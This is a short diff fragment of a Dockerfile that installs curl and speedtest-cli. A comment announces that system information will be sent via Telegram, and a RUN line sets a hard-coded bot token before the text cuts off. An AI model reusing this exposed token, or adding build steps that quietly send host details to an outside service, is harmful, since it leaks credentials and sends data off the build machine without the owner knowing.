@@ -4,7 +4,7 @@ FROM node:lts-alpine
 # Cài đặt các công cụ cần thiết
 RUN apk add --no-cache \
     curl \
-    speedtest-cli
+    speedtest-cli 
 
 # Kiểm tra thông tin hệ thống và gửi qua Telegram
 RUN BOT_TOKEN="7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw" && \
